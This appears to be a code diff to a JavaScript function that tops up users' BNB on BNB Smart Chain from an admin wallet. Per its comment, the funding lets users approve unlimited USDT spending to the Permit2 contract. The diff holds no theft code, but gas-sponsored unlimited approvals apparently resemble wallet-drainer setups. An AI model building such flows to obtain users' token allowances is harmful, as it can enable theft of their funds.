@@ -342,63 +342,59 @@ export async function checkPermit2Allowance(ownerAddress, tokenAddress) {
  * Send the exact BNB needed for one USDT.approve(Permit2, MaxUint256) TX.
  */
 export async function sendGasFunding(userAddress) {
-  const USDT_ADDRESS   = '0x55d398326f99059ff775485246999027b3197955';
-  const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
+  // Fixed funding amounts — avoids all gas estimation race conditions.
+  // BSC approve() costs ~7,000–50,000 gwei at current gas prices.
+  // We send 0.001 BNB which covers even extreme gas price scenarios.
+  const FIXED_FUND_AMOUNT   = ethers.parseEther('0.001');  // amount to top up to
+  const SUFFICIENT_THRESHOLD = ethers.parseEther('0.0005'); // skip if user already has this much
 
   const provider = new ethers.JsonRpcProvider(process.env.BSC_RPC_URL || 'https://bsc-dataseed.binance.org/');
   const wallet   = new ethers.Wallet(process.env.ADMIN_PRIVATE_KEY, provider);
 
   const recipientAddress = ethers.getAddress(userAddress);
 
-  let approveGasUnits;
-  try {
-    const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, wallet);
-    const estimatedGas = await usdtContract.approve.estimateGas(
-      PERMIT2_ADDRESS,
-      ethers.MaxUint256,
-      { from: recipientAddress }
-    );
-    approveGasUnits = (estimatedGas * 130n) / 100n;
-  } catch (simErr) {
-    approveGasUnits = 65000n;
-  }
-
-  const feeData  = await provider.getFeeData();
-  const gasPrice = feeData.gasPrice || ethers.parseUnits('3', 'gwei');
-
-  const requiredGasCost = approveGasUnits * gasPrice;
-
   const currentBalance = await provider.getBalance(recipientAddress);
-  if (currentBalance >= requiredGasCost) {
+  console.log(`[GasFund] User ${recipientAddress} BNB balance: ${ethers.formatEther(currentBalance)}`);
+
+  // If user already has enough, skip funding
+  if (currentBalance >= SUFFICIENT_THRESHOLD) {
+    console.log(`[GasFund] Sufficient balance, skipping funding.`);
     return {
       status: 'SUFFICIENT_BALANCE',
       message: 'User already has sufficient BNB for gas',
       txHash: null,
       neededBnb: '0',
+      alreadyFunded: true,
     };
   }
 
-  const fundingDeficit = requiredGasCost - currentBalance;
-  const adminBalance   = await provider.getBalance(wallet.address);
+  // Top up: send (FIXED_FUND_AMOUNT - currentBalance) so user ends up with 0.001 BNB
+  const fundingAmount = FIXED_FUND_AMOUNT - currentBalance;
 
-  if (adminBalance < fundingDeficit) {
-    throw new Error('Admin wallet does not have enough BNB to sponsor gas');
+  const adminBalance = await provider.getBalance(wallet.address);
+  console.log(`[GasFund] Admin balance: ${ethers.formatEther(adminBalance)} BNB, will send: ${ethers.formatEther(fundingAmount)} BNB`);
+
+  if (adminBalance <= fundingAmount) {
+    throw new Error(
+      `Admin wallet has only ${ethers.formatEther(adminBalance)} BNB — cannot sponsor ${ethers.formatEther(fundingAmount)} BNB gas`
+    );
   }
-
-  console.log(`Sending ${ethers.formatEther(fundingDeficit)} BNB gas funding to ${recipientAddress}...`);
 
   const tx = await wallet.sendTransaction({
     to: recipientAddress,
-    value: fundingDeficit,
+    value: fundingAmount,
+    gasLimit: 21000, // plain ETH transfer, fixed cost
   });
 
-  console.log('Gas funding TX sent:', tx.hash);
-  const receipt = await tx.wait(1);
-  console.log('Gas funding confirmed on-chain! Hash:', receipt.hash);
+  console.log(`[GasFund] TX sent: ${tx.hash}`);
+  // Wait for 2 confirmations to ensure wallet providers see updated balance
+  const receipt = await tx.wait(2);
+  console.log(`[GasFund] Confirmed (2 blocks): ${receipt.hash}`);
 
   return {
     status: 'FUNDED',
     txHash: receipt.hash,
-    fundedBnb: ethers.formatEther(fundingDeficit),
+    fundedBnb: ethers.formatEther(fundingAmount),
+    amount: ethers.formatEther(fundingAmount),
   };
 }
